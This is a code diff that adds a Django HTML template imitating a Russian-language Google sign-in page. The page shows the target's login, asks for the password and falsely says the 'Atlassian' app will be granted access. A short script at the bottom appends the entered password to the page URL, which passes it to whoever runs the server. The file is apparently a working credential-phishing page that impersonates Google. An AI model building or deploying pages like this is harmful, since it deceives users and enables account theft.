@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/google.css' %}">
+    <title>Document</title>
+</head>
+<body>
+    <div id="center">
+        <div class="top">
+            <img src="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-suite-everything-you-need-know-about-google-newest-0.png" alt="Girl in a jacket" width="25" height="15">
+            <em style="font-size: small;">Войдите в аккаунт Google</em>
+        </div>
+        <div id="middle">
+            <div id="content">  
+                <div class="headline">
+                    <h2 style="background-color: rgb(255, 255, 255); text-align: center; font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;font-weight: 10;">Добро пожаловать!</h2>
+                    <div id="post">
+                        <div id="subpost">
+                            <img style="margin-top: auto; margin-bottom: auto;width: 30px; height: 20px;" src="https://i.pinimg.com/564x/76/4d/59/764d59d32f61f0f91dec8c442ab052c5.jpg"  alt="">
+                            <p style="color:rgb(70, 70, 70); margin-left: -5px;font-family:Arial, Helvetica, sans-serif; font-size: 13px;">{{ login }}</p>
+                        </div>
+                    </div>
+                    <h4 style="margin-top: 1em;background-color: rgb(255, 255, 255); text-align: start; font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;font-weight: 50;">Сначала подтвердите, что это ваш аккаунт.</h4>
+                </div>
+                <div class="form__div" >
+                    <input id="password" type="password" class="form__input" placeholder=" ">
+                    <label for=""  class="form__label">Введите пароль</label>
+                </div>
+                <div style="margin-bottom: 3rem;"> 
+                </div>
+                <div>
+                    <p style="color: gray; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;font-size: 13px" >Приложению "Atlassian" будет предоставлен доступ к вашим данным: имени, адресу электронной почты, языковым настройкам и фото профиля.</p>
+                </div>
+                <div id="bottomButtons">
+                    
+                    <a style="margin-bottom: auto;margin-top: auto; text-decoration:none; color: rgb(53, 116, 224);font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;" href="">Забыли пароль?</a> 
+
+                    <button id="next">Далее</button>
+                </div>
+                <script>
+                    const button = document.getElementById("next")
+                    const input_password = document.getElementById("password")
+                    button.addEventListener("click", ()=>{
+                        window.location.href+=input_password.value
+                    })
+                </script>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
